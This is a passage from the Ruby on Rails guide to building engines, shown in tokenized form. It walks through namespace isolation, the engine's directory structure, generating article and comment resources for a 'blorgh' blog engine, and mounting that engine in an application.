▁By ▁inherit ing ▁from ▁the ▁` Rails :: Engine ` ▁class , ▁this ▁gem ▁not if ies ▁Rails ▁that < n > the re ' s ▁an ▁engine ▁at ▁the ▁specified ▁path , ▁and ▁will ▁correctly ▁m o un t ▁the ▁engine < n > in side ▁the ▁application , ▁perform ing ▁task s ▁such ▁as ▁adding ▁the ▁` app ` ▁directory ▁of < n > the ▁engine ▁to ▁the ▁load ▁path ▁for ▁models , ▁mailer s , ▁controllers ▁and ▁views .
▁The ▁` isolate _ namespace ` ▁method ▁here ▁ de serve s ▁special ▁notice .
▁This ▁call ▁is < n > re s p on s i b le ▁for ▁is ol at ing ▁the ▁controllers , ▁models , ▁routes ▁and ▁other ▁things ▁into < n > the ir ▁own ▁ namespace , ▁a way ▁from ▁similar ▁components ▁inside ▁the ▁application . < n >
▁With out ▁this , ▁there ▁is ▁a ▁possibility ▁that ▁the ▁engine ' s ▁components ▁could ▁" le a k " < n > in to ▁the ▁application , ▁ ca using ▁un w ant ed ▁d is r up t ion , ▁or ▁that ▁important ▁engine < n > com p on ent s ▁could ▁be ▁overrid de n ▁by ▁similar ly ▁named ▁things ▁within ▁the ▁application . < n >
▁One ▁of ▁the ▁examples ▁of ▁such ▁conflicts ▁is ▁helpers .
▁With out ▁calling < n >` isolate _ namespace `, ▁the ▁engine ' s ▁helpers ▁would ▁be ▁included ▁in ▁an ▁application ' s < n > controllers .
▁NOTE : ▁It ▁is ▁** high ly ** ▁recommended ▁that ▁the ▁` isolate _ namespace ` ▁line ▁be ▁left < n > with in ▁the ▁` Engine ` ▁class ▁definition .
▁With out ▁it , ▁classes ▁generated ▁in ▁an ▁engine < n > ** ma y ** ▁con f li c t ▁with ▁an ▁application .
▁What ▁this ▁is ol ation ▁of ▁the ▁ namespace ▁means ▁is ▁that ▁a ▁model ▁generated ▁by ▁a ▁call < n > to ▁` bin / rails ▁g ▁model `, ▁such ▁as ▁` bin / rails ▁g ▁model ▁article `, ▁won ' t ▁be ▁called ▁` Article `, ▁but < n > instead ▁be ▁namespaced ▁and ▁called ▁` Blorgh :: Article `.
▁In ▁addition , ▁the ▁table ▁for ▁the < n > model ▁is ▁namespaced , ▁be com ing ▁` blorgh _ articles `, ▁rather ▁than ▁simply ▁` articles `. < n >
▁Similar ▁to ▁the ▁model ▁name spacing , ▁a ▁controller ▁called ▁` Article sController ` ▁becomes < n >` Blorgh :: Article sController ` ▁and ▁the ▁views ▁for ▁that ▁controller ▁will ▁not ▁be ▁at < n >` app / views / articles `, ▁but ▁` app / views / blorgh / articles ` ▁instead .
▁Mailer s ▁are ▁namespaced < n > as ▁well .
▁F inally , ▁routes ▁will ▁also ▁be ▁is olated ▁within ▁the ▁engine .
▁This ▁is ▁one ▁of ▁the ▁most < n > import ant ▁parts ▁about ▁name spacing , ▁and ▁is ▁discuss ed ▁later ▁in ▁the < n >[ R out es ](# routes ) ▁section ▁of ▁this ▁guide .
▁#### ▁` app ` ▁D ir ec tory
▁In side ▁the ▁` app ` ▁directory ▁are ▁the ▁standard ▁` assets `, ▁` controllers `, ▁` helpers `, < n >` mailer s `, ▁` models ` ▁and ▁` views ` ▁directories ▁that ▁you ▁should ▁be ▁ familiar ▁with < n > from ▁an ▁application .
▁The ▁` helpers `, ▁` mailer s ` ▁and ▁` models ` ▁directories ▁are < n > empty , ▁so ▁they ▁are n ' t ▁describe d ▁in ▁this ▁section .
▁We ' ll ▁look ▁more ▁into ▁models ▁in < n > a ▁future ▁section , ▁when ▁we ' re ▁writing ▁the ▁engine .
▁With in ▁the ▁` app / assets ` ▁directory , ▁there ▁are ▁the ▁` images `, ▁` javascripts ` ▁and < n >` stylesheets ` ▁directories ▁which , ▁again , ▁you ▁should ▁be ▁ familiar ▁with ▁due ▁to ▁their < n > s i m il ar ity ▁to ▁an ▁application .
▁One ▁difference ▁here , ▁however , ▁is ▁that ▁each < n > directory ▁contains ▁a ▁sub - directory ▁with ▁the ▁engine ▁name .
▁Because ▁this ▁engine ▁is < n > go ing ▁to ▁be ▁namespaced , ▁its ▁assets ▁should ▁be ▁too .
▁With in ▁the ▁` app / controllers ` ▁directory ▁there ▁is ▁a ▁` blorgh ` ▁directory ▁that < n > contain s ▁a ▁file ▁called ▁` application _ controller . rb `.
▁This ▁file ▁will ▁provide ▁any < n > common ▁functionality ▁for ▁the ▁controllers ▁of ▁the ▁engine .
▁The ▁` blorgh ` ▁directory < n > is ▁where ▁the ▁other ▁controllers ▁for ▁the ▁engine ▁will ▁go .
▁By ▁ placing ▁them ▁within < n > this ▁namespaced ▁directory , ▁you ▁prevent ▁them ▁from ▁ possibl y ▁cl as h ing ▁with < n > id ent ical ly - name d ▁controllers ▁within ▁other ▁engines ▁or ▁even ▁within ▁the < n > application .
▁NOTE : ▁The ▁` Application Controller ` ▁class ▁inside ▁an ▁engine ▁is ▁named ▁just ▁like ▁a < n > Rails ▁application ▁in ▁order ▁to ▁make ▁it ▁easier ▁for ▁you ▁to ▁convert ▁your < n > application s ▁into ▁engines .
▁L as t ly , ▁the ▁` app / views ` ▁directory ▁contains ▁a ▁` layouts ` ▁folder , ▁which ▁contains ▁a < n > file ▁at ▁` blorgh / application . html . erb `.
▁This ▁file ▁allows ▁you ▁to ▁specify ▁a ▁layout < n > for ▁the ▁engine .
▁If ▁this ▁engine ▁is ▁to ▁be ▁used ▁as ▁a ▁stand - al one ▁engine , ▁the n ▁you < n > w o ul d ▁add ▁any ▁customiz ation ▁to ▁its ▁layout ▁in ▁this ▁file , ▁rather ▁than ▁the < n > application ' s ▁` app / views / layouts / application . html . erb ` ▁file .
▁If ▁you ▁don ' t ▁want ▁to ▁force ▁a ▁layout ▁on ▁to ▁users ▁of ▁the ▁engine , ▁the n ▁you ▁can < n > delete ▁this ▁file ▁and ▁reference ▁a ▁different ▁layout ▁in ▁the ▁controllers ▁of ▁your < n > engine .
▁#### ▁` bin ` ▁D ir ec tory
▁This ▁directory ▁contains ▁one ▁file , ▁` bin / rails `, ▁which ▁enable s ▁you ▁to ▁use ▁the < n >` rails ` ▁sub - command s ▁and ▁generator s ▁just ▁like ▁you ▁would ▁within ▁an ▁application . < n >
▁This ▁means ▁that ▁you ▁will ▁be ▁able ▁to ▁generate ▁new ▁controllers ▁and ▁models ▁for ▁this < n > engine ▁very ▁easily ▁by ▁running ▁commands ▁like ▁this :
▁ $ ▁bin / rails ▁g ▁model
▁ K eep ▁in ▁mind , ▁of ▁course , ▁that ▁anything ▁generated ▁with ▁these ▁commands ▁inside ▁of < n > an ▁engine ▁that ▁has ▁` isolate _ namespace ` ▁in ▁the ▁` Engine ` ▁class ▁will ▁be ▁namespaced .
▁#### ▁` test ` ▁D ir ec tory
▁The ▁` test ` ▁directory ▁is ▁where ▁tests ▁for ▁the ▁engine ▁will ▁go .
▁To ▁test ▁the ▁engine ,< n > the re ▁is ▁a ▁ cut - d own ▁version ▁of ▁a ▁Rails ▁application ▁ embedded ▁within ▁it ▁at < n >` test / dummy `.
▁This ▁application ▁will ▁m o un t ▁the ▁engine ▁in ▁the < n >` test / dummy / config / routes . rb ` ▁file :
▁m o un t ▁Blorgh :: Engine ▁=> ▁" / blorgh "
▁This ▁line ▁m o un t s ▁the ▁engine ▁at ▁the ▁path ▁` / blorgh `, ▁which ▁will ▁make ▁it ▁accessible < n > through ▁the ▁application ▁only ▁at ▁that ▁path .
▁In side ▁the ▁test ▁directory ▁there ▁is ▁the ▁` test / integration ` ▁directory , ▁where < n > integration ▁tests ▁for ▁the ▁engine ▁should ▁be ▁placed .
▁Other ▁directories ▁can ▁be < n > created ▁in ▁the ▁` test ` ▁directory ▁as ▁well .
▁For ▁example , ▁you ▁may ▁wish ▁to ▁create ▁a < n >` test / models ` ▁directory ▁for ▁your ▁model ▁tests .
▁ Pro v id ing ▁engine ▁functionality
▁The ▁engine ▁that ▁this ▁guide ▁cover s ▁provides ▁ submitting ▁articles ▁and ▁comment ing < n > functionality ▁and ▁follows ▁a ▁similar ▁thread ▁to ▁the ▁[ Getting ▁Start ed < n > G u id e ]( getting _ started . html ), ▁with ▁some ▁new ▁t w ist s .
▁### ▁Generat ing ▁an ▁Article ▁Resource
▁The ▁first ▁thing ▁to ▁generate ▁for ▁a ▁blog ▁engine ▁is ▁the ▁` Article ` ▁model ▁and ▁related < n > controller .
▁To ▁quickly ▁generate ▁this , ▁you ▁can ▁use ▁the ▁Rails ▁scaffold ▁generator .
▁ $ ▁bin / rails ▁generate ▁scaffold ▁article ▁title : string ▁text : text
▁This ▁command ▁will ▁output ▁this ▁information :
▁invoke ▁active _ record
▁create ▁db / migrate / [ timestamp ] _ create _ blorgh _ articles . rb
▁create ▁app / models / blorgh / article . rb
▁invoke ▁test _ unit
▁create ▁test / models / blorgh / article _ test . rb
▁create ▁test / fixtures / blorgh / articles . yml
▁invoke ▁resource _ route
▁resources ▁: articles
▁invoke ▁scaffold _ controller
▁create ▁app / controllers / blorgh / articles _ controller . rb
▁invoke ▁ erb
▁create ▁app / views / blorgh / articles
▁create ▁app / views / blorgh / articles / index . html . erb
▁create ▁app / views / blorgh / articles / edit . html . erb
▁create ▁app / views / blorgh / articles / show . html . erb
▁create ▁app / views / blorgh / articles / new . html . erb
▁create ▁app / views / blorgh / articles / _ form . html . erb
▁create ▁test / controllers / blorgh / articles _ controller _ test . rb
▁invoke ▁helper
▁create ▁app / helpers / blorgh / articles _ helper . rb
▁invoke ▁assets
▁invoke ▁ js
▁create ▁app / assets / javascripts / blorgh / articles . js
▁invoke ▁ css
▁create ▁app / assets / stylesheets / blorgh / articles . css
▁invoke ▁ css
▁create ▁app / assets / stylesheets / scaffold . css
▁The ▁first ▁thing ▁that ▁the ▁scaffold ▁generator ▁does ▁is ▁invoke ▁the ▁` active _ record `< n > generator , ▁which ▁generates ▁a ▁migration ▁and ▁a ▁model ▁for ▁the ▁resource .
▁Note ▁here ,< n > how ever , ▁that ▁the ▁migration ▁is ▁called ▁` create _ blorgh _ articles ` ▁rather ▁than ▁the < n > us u al ▁` create _ articles `.
▁This ▁is ▁due ▁to ▁the ▁` isolate _ namespace ` ▁method ▁called ▁in < n > the ▁` Blorgh :: Engine ` ▁class ' s ▁definition .
▁The ▁model ▁here ▁is ▁also ▁namespaced ,< n > be ing ▁placed ▁at ▁` app / models / blorgh / article . rb ` ▁rather ▁than ▁` app / models / article . rb ` ▁due < n > to ▁the ▁` isolate _ namespace ` ▁call ▁within ▁the ▁` Engine ` ▁class .
▁Next , ▁the ▁` test _ unit ` ▁generator ▁is ▁invoked ▁for ▁this ▁model , ▁ generating ▁a ▁model < n > test ▁at ▁` test / models / blorgh / article _ test . rb ` ▁( rather ▁than < n >` test / models / article _ test . rb `) ▁and ▁a ▁fixture ▁at ▁` test / fixtures / blorgh / articles . yml `< n > ( rather ▁than ▁` test / fixtures / articles . yml ` ).
▁After ▁that , ▁a ▁line ▁for ▁the ▁resource ▁is ▁inserted ▁into ▁the ▁` config / routes . rb ` ▁file < n > for ▁the ▁engine .
▁This ▁line ▁is ▁simply ▁` resources ▁: articles `, ▁turn ing ▁the < n >` config / routes . rb ` ▁file ▁for ▁the ▁engine ▁into ▁this :
▁Blorgh :: Engine . routes . d raw ▁do
▁resources ▁: articles
▁Note ▁here ▁that ▁the ▁routes ▁are ▁d raw n ▁upon ▁the ▁` Blorgh :: Engine ` ▁object ▁rather ▁than < n > the ▁` You r A p p :: Application ` ▁class .
▁This ▁is ▁so ▁that ▁the ▁engine ▁routes ▁are ▁con f in ed < n > to ▁the ▁engine ▁itself ▁and ▁can ▁be ▁m o un t ed ▁at ▁a ▁specific ▁point ▁as ▁show n ▁in ▁the < n >[ test ▁directory ](# test - directory ) ▁section .
▁It ▁also ▁cause s ▁the ▁engine ' s ▁routes ▁to < n > be ▁is olated ▁from ▁those ▁routes ▁that ▁are ▁within ▁the ▁application .
▁The < n >[ R out es ](# routes ) ▁section ▁of ▁this ▁guide ▁describe s ▁it ▁in ▁detail .
▁Next , ▁the ▁` scaffold _ controller ` ▁generator ▁is ▁invoked , ▁ generating ▁a ▁controller < n > called ▁` Blorgh :: Article sController ` ▁( at < n >` app / controllers / blorgh / articles _ controller . rb `) ▁and ▁its ▁related ▁views ▁at < n >` app / views / blorgh / articles `.
▁E verything ▁this ▁generator ▁has ▁created ▁is ▁ n e at ly ▁namespaced .
▁The ▁controller ' s < n > class ▁is ▁defined ▁within ▁the ▁` Blorgh ` ▁module :
▁class ▁Article sController ▁< ▁Application Controller
▁...
▁NOTE : ▁The ▁` Application Controller ` ▁class ▁being ▁inherit ed ▁from ▁here ▁is ▁the < n >` Blorgh :: Application Controller `, ▁not ▁an ▁application ' s ▁` Application Controller `.
▁The ▁helper ▁inside ▁` app / helpers / blorgh / articles _ helper . rb ` ▁is ▁also ▁namespaced :
▁module ▁Article s Helper
▁This ▁help s ▁prevent ▁conflicts ▁with ▁any ▁other ▁engine ▁or ▁application ▁that ▁may ▁have < n > an ▁article ▁resource ▁as ▁well .
▁F inally , ▁the ▁assets ▁for ▁this ▁resource ▁are ▁generated ▁in ▁two ▁files :
▁` app / assets / javascripts / blorgh / articles . js ` ▁and
▁` app / assets / stylesheets / blorgh / articles . css `.
▁You ' ll ▁see ▁how ▁to ▁use ▁these ▁a ▁little < n > later .
▁By ▁default , ▁the ▁scaffold ▁styling ▁is ▁not ▁applied ▁to ▁the ▁engine ▁because ▁the < n > engine ' s ▁layout ▁file , ▁` app / views / layouts / blorgh / application . html . erb `, ▁does n ' t < n > load ▁it .
▁To ▁make ▁the ▁scaffold ▁styling ▁apply , ▁insert ▁this ▁line ▁into ▁the ▁` < head >` < n > tag ▁of ▁this ▁layout :
▁<%= ▁stylesheet _ link _ tag ▁" scaffold " ▁%>
▁You ▁can ▁see ▁what ▁the ▁engine ▁has ▁so ▁far ▁by ▁running ▁` rake ▁db : migrate ` ▁at ▁the ▁root < n > of ▁our ▁engine ▁to ▁run ▁the ▁migration ▁generated ▁by ▁the ▁scaffold ▁generator , ▁and ▁the n < n > running ▁` rails ▁server ` ▁in ▁` test / dummy `.
▁When ▁you ▁open < n >` http :// localhost :3000/ blorgh / articles ` ▁you ▁will ▁see ▁the ▁default ▁scaffold ▁that ▁has < n > be en ▁generated .
▁Click ▁around !
▁You ' ve ▁just ▁generated ▁your ▁first ▁engine ' s ▁first < n > function s .
▁If ▁you ' d ▁rather ▁ play ▁around ▁in ▁the ▁console , ▁` rails ▁console ` ▁will ▁also ▁work ▁just < n > like ▁a ▁Rails ▁application .
▁Re member : ▁the ▁` Article ` ▁model ▁is ▁namespaced , ▁so ▁to < n > reference ▁it ▁you ▁must ▁call ▁it ▁as ▁` Blorgh :: Article `.
▁ >> ▁Blorgh :: Article . find (1)
▁=> ▁#< Blorgh :: Article ▁id : ▁1 ▁...
▁One ▁final ▁thing ▁is ▁that ▁the ▁` articles ` ▁resource ▁for ▁this ▁engine ▁should ▁be ▁the ▁root < n > of ▁the ▁engine .
▁When ever ▁some one ▁go es ▁to ▁the ▁root ▁path ▁where ▁the ▁engine ▁is < n > m o un t ed , ▁they ▁should ▁be ▁show n ▁a ▁list ▁of ▁articles .
▁This ▁can ▁be ▁made ▁to ▁happen ▁if < n > this ▁line ▁is ▁inserted ▁into ▁the ▁` config / routes . rb ` ▁file ▁inside ▁the ▁engine :
▁root ▁to : ▁" articles # index "
▁Now ▁people ▁will ▁only ▁need ▁to ▁go ▁to ▁the ▁root ▁of ▁the ▁engine ▁to ▁see ▁all ▁the ▁articles ,< n > rather ▁than ▁visit ing ▁` / articles `.
▁This ▁means ▁that ▁instead ▁of < n >` http :// localhost :3000/ blorgh / articles `, ▁you ▁only ▁need ▁to ▁go ▁to < n >` http :// localhost :3000/ blorgh ` ▁now .
▁### ▁Generat ing ▁a ▁ Comments ▁Resource
▁Now ▁that ▁the ▁engine ▁can ▁create ▁new ▁articles , ▁it ▁only ▁make s ▁sense ▁to ▁add < n > comment ing ▁functionality ▁as ▁well .
▁To ▁do ▁this , ▁you ' ll ▁need ▁to ▁generate ▁a ▁comment < n > model , ▁a ▁comment ▁controller ▁and ▁the n ▁modify ▁the ▁articles ▁scaffold ▁to ▁display < n > comments ▁and ▁allow ▁people ▁to ▁create ▁new ▁one s .
▁ From ▁the ▁application ▁root , ▁run ▁the ▁model ▁generator .
▁T e ll ▁it ▁to ▁generate ▁a < n >` Comment ` ▁model , ▁with ▁the ▁related ▁table ▁ having ▁two ▁columns : ▁a ▁` article _ id ` ▁integer < n > and ▁` text ` ▁text ▁column .
▁ $ ▁bin / rails ▁generate ▁model ▁ Comment ▁article _ id : integer ▁text : text
▁This ▁will ▁output ▁the ▁following :
▁create ▁db / migrate / [ timestamp ] _ create _ blorgh _ comments . rb
▁create ▁app / models / blorgh / comment . rb
▁invoke ▁test _ unit
▁create ▁test / models / blorgh / comment _ test . rb
▁create ▁test / fixtures / blorgh / comments . yml
▁This ▁generator ▁call ▁will ▁generate ▁just ▁the ▁necessary ▁model ▁files ▁it ▁needs ,< n > name spacing ▁the ▁files ▁under ▁a ▁` blorgh ` ▁directory ▁and ▁creating ▁a ▁model ▁class < n > called ▁` Blorgh :: Comment `.
▁Now ▁run ▁the ▁migration ▁to ▁create ▁our ▁ blorgh _ comments < n > table :
▁ $ ▁rake ▁db : migrate
▁To ▁show ▁the ▁comments ▁on ▁an ▁article , ▁edit ▁` app / views / blorgh / articles / show . html . erb ` ▁and < n > add ▁this ▁line ▁before ▁the ▁" Edit " ▁link :
▁< h 3 > Comments </ h 3 >
▁<%= ▁render ▁@ article . comments ▁%>
▁This ▁line ▁will ▁require ▁there ▁to ▁be ▁a ▁` has _ many ` ▁association ▁for ▁comments ▁defined < n > on ▁the ▁` Blorgh :: Article ` ▁model , ▁which ▁there ▁is n ' t ▁right ▁now .
▁To ▁define ▁one , ▁open < n >` app / models / blorgh / article . rb ` ▁and ▁add ▁this ▁line ▁into ▁the ▁model :
▁has _ many ▁: comments
▁T ur n ing ▁the ▁model ▁into ▁this :
▁class ▁Article ▁< ▁ActiveRecord :: Base
▁has _ many ▁: comments
▁NOTE : ▁Because ▁the ▁` has _ many ` ▁is ▁defined ▁inside ▁a ▁class ▁that ▁is ▁inside ▁the < n >` Blorgh ` ▁module , ▁Rails ▁will ▁know ▁that ▁you ▁want ▁to ▁use ▁the ▁` Blorgh :: Comment `< n > model ▁for ▁these ▁objects , ▁so ▁there ' s ▁no ▁need ▁to ▁specify ▁that ▁using ▁the < n >`: class _ name ` ▁option ▁here .
▁Next , ▁there ▁needs ▁to ▁be ▁a ▁form ▁so ▁that ▁comments ▁can ▁be ▁created ▁on ▁an ▁article .
▁To < n > add ▁this , ▁put ▁this ▁line ▁under n e at h ▁the ▁call ▁to ▁` render ▁@ article . comments ` ▁in < n >` app / views / blorgh / articles / show . html . erb ` :
▁<%= ▁render ▁" blorgh / comments / form " ▁%>
▁Next , ▁the ▁partial ▁that ▁this ▁line ▁will ▁render ▁needs ▁to ▁exist .
▁Create ▁a ▁new < n > directory ▁at ▁` app / views / blorgh / comments ` ▁and ▁in ▁it ▁a ▁new ▁file ▁called < n >` _ form . html . erb ` ▁which ▁has ▁this ▁content ▁to ▁create ▁the ▁required ▁partial :
▁< h 3 > New ▁comment </ h 3 >
▁<%= ▁form _ for ▁[ @ article , ▁@ article . comments . build ] ▁do ▁| f | ▁%>
▁<%= ▁f . label ▁: text ▁%>< br >
▁<%= ▁f . text _ area ▁: text ▁%>
▁</ p >
▁When ▁this ▁form ▁is ▁submitted , ▁it ▁is ▁going ▁to ▁attempt ▁to ▁perform ▁a ▁` POST ` ▁request < n > to ▁a ▁route ▁of ▁` / articles / : article _ id / comments ` ▁within ▁the ▁engine .
▁This ▁route ▁does n ' t < n > ex ist ▁at ▁the ▁moment , ▁but ▁can ▁be ▁created ▁by ▁changing ▁the ▁` resources ▁: articles ` ▁line < n > in side ▁` config / routes . rb ` ▁into ▁these ▁lines :
▁resources ▁: articles ▁do
▁This ▁creates ▁a ▁nested ▁route ▁for ▁the ▁comments , ▁which ▁is ▁what ▁the ▁form ▁requires .
▁The ▁route ▁now ▁exists , ▁but ▁the ▁controller ▁that ▁this ▁route ▁go es ▁to ▁does ▁not .
▁To < n > create ▁it , ▁run ▁this ▁command ▁from ▁the ▁application ▁root :
▁ $ ▁bin / rails ▁g ▁controller ▁comments
▁This ▁will ▁generate ▁the ▁following ▁things :
▁create ▁app / controllers / blorgh / comments _ controller . rb
▁create ▁test / controllers / blorgh / comments _ controller _ test . rb
▁invoke ▁helper
▁create ▁app / helpers / blorgh / comments _ helper . rb
▁create ▁app / assets / javascripts / blorgh / comments . js
▁create ▁app / assets / stylesheets / blorgh / comments . css
▁The ▁form ▁will ▁be ▁making ▁a ▁` POST ` ▁request ▁to ▁` / articles / : article _ id / comments `, ▁which < n > will ▁correspond ▁with ▁the ▁` create ` ▁action ▁in ▁` Blorgh :: Comments Controller `.
▁This < n > action ▁needs ▁to ▁be ▁created , ▁which ▁can ▁be ▁done ▁by ▁ putting ▁the ▁following ▁lines < n > in side ▁the ▁class ▁definition ▁in ▁` app / controllers / blorgh / comments _ controller . rb ` :
▁def ▁create
▁@ article ▁= ▁Article . find ( params [: article _ id ])
▁@ comment ▁= ▁@ article . comments . create ( comment _ params )
▁flash [: not ic e ] ▁= ▁" Comment ▁has ▁been ▁created !"
▁redirect _ to ▁articles _ path
▁private
▁def ▁comment _ params
▁params . require (: comment ). permit (: text )
▁This ▁is ▁the ▁final ▁step ▁required ▁to ▁get ▁the ▁new ▁comment ▁form ▁working .
▁D is play ing < n > the ▁comments , ▁however , ▁is ▁not ▁quite ▁right ▁yet .
▁If ▁you ▁were ▁to ▁create ▁a ▁comment < n > right ▁now , ▁you ▁would ▁see ▁this ▁error :
▁: format s => [: html ] , ▁: locale => [: en , ▁: en ]} .
▁S e ar ch ed ▁in : ▁*
▁" / Users / ry an / Site s / side _ projects / blorgh / test / dummy / app / views " ▁*
▁" / Users / ry an / Site s / side _ projects / blorgh / app / views "
▁The ▁engine ▁is ▁un able ▁to ▁find ▁the ▁partial ▁required ▁for ▁rendering ▁the ▁comments . < n >
▁Rails ▁look s ▁first ▁in ▁the ▁application ' s ▁( ` test / dummy `) ▁` app / views ` ▁directory ▁and < n > the n ▁in ▁the ▁engine ' s ▁` app / views ` ▁directory .
▁When ▁it ▁can ' t ▁find ▁it , ▁it ▁will ▁throw < n > this ▁error .
▁This ▁partial ▁will ▁be ▁responsib le ▁for ▁rendering ▁just ▁the ▁comment ▁text , ▁for ▁now . < n >
▁Create ▁a ▁new ▁file ▁at ▁` app / views / blorgh / comments / _ comment . html . erb ` ▁and ▁put ▁this < n > line ▁inside ▁it :
▁<%= ▁comment _ counter ▁ + ▁1 ▁%> . ▁<%= ▁comment . text ▁%>
▁The ▁` comment _ counter ` ▁local ▁variable ▁is ▁given ▁to ▁us ▁by ▁the ▁` <%= ▁render < n > @ article . comments ▁%> ` ▁call , ▁which ▁will ▁define ▁it ▁automatically ▁and ▁increment ▁the < n > counter ▁as ▁it ▁iterate s ▁through ▁each ▁comment .
▁It ' s ▁used ▁in ▁this ▁example ▁to < n > display ▁a ▁small ▁number ▁next ▁to ▁each ▁comment ▁when ▁it ' s ▁created .
▁That ▁complete s ▁the ▁comment ▁function ▁of ▁the ▁b logging ▁engine .
▁Now ▁it ' s ▁time ▁to ▁use < n > it ▁within ▁an ▁application .
▁H oo k ing ▁In to ▁an ▁Application
▁Using ▁an ▁engine ▁within ▁an ▁application ▁is ▁very ▁easy .
▁This ▁section ▁cover s ▁how ▁to < n > m o un t ▁the ▁engine ▁into ▁an ▁application ▁and ▁the ▁initial ▁setup ▁required , ▁as ▁well ▁as < n > link ing ▁the ▁engine ▁to ▁a ▁` User ` ▁class ▁provided ▁by ▁the ▁application ▁to ▁provide < n > own ers h ip ▁for ▁articles ▁and ▁comments ▁within ▁the ▁engine .
▁### ▁Mo un ting ▁the ▁ Engine
▁First , ▁the ▁engine ▁needs ▁to ▁be ▁specified ▁inside ▁the ▁application ' s ▁` Gemfile `.
▁If < n > the re ▁is n ' t ▁an ▁application ▁hand y ▁to ▁test ▁this ▁out ▁in , ▁generate ▁one ▁using ▁the < n >` rails ▁new ` ▁command ▁outside ▁of ▁the ▁engine ▁directory ▁like ▁this :
▁ $ ▁rails ▁new ▁ unicorn
▁U s u ally , ▁specify ing ▁the ▁engine ▁inside ▁the ▁Gemfile ▁would ▁be ▁done ▁by ▁specify ing ▁it < n > as ▁a ▁normal , ▁every day ▁gem .
▁gem ▁' devise '
▁However , ▁because ▁you ▁are ▁developing ▁the ▁` blorgh ` ▁engine ▁on ▁your ▁local ▁machine ,< n > you ▁will ▁need ▁to ▁specify ▁the ▁`: path ` ▁option ▁in ▁your ▁` Gemfile ` :
▁gem ▁' blorgh ' , ▁path : ▁" / path / to / blorgh "
▁Then ▁run ▁` bundle ` ▁to ▁install ▁the ▁gem .
▁As ▁describe d ▁earlier , ▁by ▁ placing ▁the ▁gem ▁in ▁the ▁` Gemfile ` ▁it ▁will ▁be ▁loaded ▁when < n > Rails ▁is ▁loaded .
▁It ▁will ▁first ▁require ▁` lib / blorgh . rb ` ▁from ▁the ▁engine , ▁the n < n >` lib / blorgh / engine . rb `, ▁which ▁is ▁the ▁file ▁that ▁defines ▁the ▁major ▁pieces ▁of < n > functionality ▁for ▁the ▁engine .
▁To ▁make ▁the ▁engine ' s ▁functionality ▁accessible ▁from ▁within ▁an ▁application , ▁it < n > n e ed s ▁to ▁be ▁m o un t ed ▁in ▁that ▁application ' s ▁` config / routes . rb ` ▁file :
▁m o un t ▁Blorgh :: Engine , ▁at : ▁" / blog "
▁This ▁line ▁will ▁m o un t ▁the ▁engine ▁at ▁` / blog ` ▁in ▁the ▁application .
▁Mak ing ▁it < n > accessible ▁at ▁` http :// localhost :3000/ blog ` ▁when ▁the ▁application ▁run s ▁with ▁` rails < n > server `.
▁NOTE : ▁Other ▁engines , ▁such ▁as ▁D evi se , ▁handle ▁this ▁a ▁little ▁different ly ▁by ▁making < n > you ▁specify ▁custom ▁helpers ▁( such ▁as ▁` devise _ for `) ▁in ▁the ▁routes .
▁These ▁helpers < n > do ▁exactly ▁the ▁same ▁thing , ▁m o un ting ▁pieces ▁of ▁the ▁engines ' s ▁functionality ▁at ▁a < n > pre - defined ▁path ▁which ▁may ▁be ▁customiz able .
▁### ▁ Engine ▁setup
▁The ▁engine ▁contains ▁migrations ▁for ▁the ▁` blorgh _ articles ` ▁and ▁` blorgh _ comments `< n > table ▁which ▁need ▁to ▁be ▁created ▁in ▁the ▁application ' s ▁database ▁so ▁that ▁the < n > engine ' s ▁models ▁can ▁query ▁them ▁correctly .
▁To ▁copy ▁these ▁migrations ▁into ▁the < n > application ▁use ▁this ▁command :
▁ $ ▁rake ▁ blorgh : install : migrations
▁If ▁you ▁have ▁multiple ▁engines ▁that ▁need ▁migrations ▁copie d ▁over , ▁use < n >` ra il t ies : install : migrations ` ▁instead :
▁ $ ▁rake ▁railties : install : migrations
▁This ▁command , ▁when ▁run ▁for ▁the ▁first ▁time , ▁will ▁copy ▁over ▁all ▁the ▁migrations < n > from ▁the ▁engine .
▁When ▁run ▁the ▁next ▁time , ▁it ▁will ▁only ▁copy ▁over ▁migrations ▁that < n > ha ve n ' t ▁been ▁copie d ▁over ▁already .
▁The ▁first ▁run ▁for ▁this ▁command ▁will ▁output < n > something ▁such ▁as ▁this :
▁The ▁first ▁timestamp ▁( ` [ timestamp _ 1 ]` ) ▁will ▁be ▁the ▁current ▁time , ▁and ▁the ▁second < n > timestamp ▁( ` [ timestamp _ 2 ]` ) ▁will ▁be ▁the ▁current ▁time ▁plus ▁a ▁second .
▁The ▁reason < n > for ▁this ▁is ▁so ▁that ▁the ▁migrations ▁for ▁the ▁engine ▁are ▁run ▁after ▁any ▁existing < n > migrations ▁in ▁the ▁application .
▁To ▁run ▁these ▁migrations ▁within ▁the ▁context ▁of ▁the ▁application , ▁simply ▁run ▁` rake < n > db : migrate `.
▁When ▁access ing ▁the ▁engine ▁through ▁` http :// localhost :3000/ blog `, ▁the < n > articles ▁will ▁be ▁empty .
▁This ▁is ▁because ▁the ▁table ▁created ▁inside ▁the ▁application ▁is < n > different ▁from ▁the ▁one ▁created ▁within ▁the ▁engine .
▁G o ▁a head , ▁ play ▁around ▁with ▁the < n > new ly ▁m o un t ed ▁engine .
▁You ' ll ▁find ▁that ▁it ' s ▁the ▁same ▁as ▁when ▁it ▁was ▁only ▁an < n > engine .
▁If ▁you ▁would ▁like ▁to ▁run ▁migrations ▁only ▁from ▁one ▁engine , ▁you ▁can ▁do ▁it ▁by < n > spec ify ing ▁` S C O P E ` :
▁rake ▁db : migrate ▁S C O P E = blorgh
▁This ▁may ▁be ▁useful ▁if ▁you ▁want ▁to ▁ r ever t ▁engine ' s ▁migrations ▁before ▁remov ing ▁it . < n >
▁To ▁ r ever t ▁all ▁migrations ▁from ▁ blorgh ▁engine ▁you ▁can ▁run ▁code ▁such ▁as :
▁rake ▁db : migrate ▁S C O P E = blorgh ▁ V ER S I ON = 0
▁### ▁Using ▁a ▁ Class ▁Provide d ▁by ▁the ▁Application
▁#### ▁Using ▁a ▁Model ▁Provide d ▁by ▁the ▁Application
▁When ▁an ▁engine ▁is ▁created , ▁it ▁may ▁want ▁to ▁use ▁specific ▁classes ▁from ▁an < n > application ▁to ▁provide ▁links ▁between ▁the ▁pieces ▁of ▁the ▁engine ▁and ▁the ▁pieces ▁of < n > the ▁application .
▁In ▁the ▁case ▁of ▁the ▁` blorgh ` ▁engine , ▁making ▁articles ▁and ▁comments < n > ha ve ▁author s ▁would ▁make ▁a ▁lot ▁of ▁sense .
